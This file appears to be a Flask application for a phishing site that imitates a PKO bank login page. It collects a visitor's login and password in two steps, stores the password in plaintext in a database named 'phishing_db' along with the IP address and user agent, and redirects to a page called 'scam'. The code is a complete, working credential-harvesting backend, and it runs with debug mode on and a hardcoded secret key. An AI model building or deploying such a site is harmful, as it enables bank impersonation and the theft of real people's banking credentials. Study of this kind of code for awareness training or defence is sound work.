from flask import Flask, render_template, request, redirect, url_for, session
import pyodbc

app = Flask(__name__)
app.secret_key = 'tajny_klucz'  

conn = pyodbc.connect(
    r'DRIVER={SQL Server};'
    r'SERVER=LAPTOKDAWIDKA\SQLEXPRESS;'
    r'DATABASE=phishing_db;'
    r'Trusted_Connection=yes;'
)
cursor = conn.cursor()

@app.route('/')
def home():
    return render_template('pko.html')

@app.route('/login')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    login = request.form['login']

    cursor.execute("SELECT id FROM users WHERE login = ?", (login,))
    user = cursor.fetchone()

    if user:
        user_id = user[0]
    else:
        cursor.execute("INSERT INTO users (login) OUTPUT INSERTED.id VALUES (?)", (login,))
        user_id = cursor.fetchone()[0]
        conn.commit()

    session['user_id'] = user_id

    return redirect(url_for('password_page'))

@app.route('/password')
def password_page():
    if 'user_id' not in session:
        return redirect(url_for('index'))  

    return render_template('password.html')

@app.route('/submit_password', methods=['POST'])
def submit_password():
    if 'user_id' not in session:
        return redirect(url_for('index'))

    password = request.form['password']
    user_id = session['user_id']

    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    cursor.execute("INSERT INTO passwords (user_id, password) VALUES (?, ?)", (user_id, password))
    conn.commit()

    cursor.execute("INSERT INTO logs (user_id, ip_address, user_agent) VALUES (?, ?, ?)", 
                   (user_id, ip_address, user_agent))
    conn.commit()

    session.pop('user_id', None)

    return redirect(url_for('scam'))

@app.route('/scam')
def scam():
    return render_template('scam.html')

if __name__ == '__main__':
    app.run(debug=True)
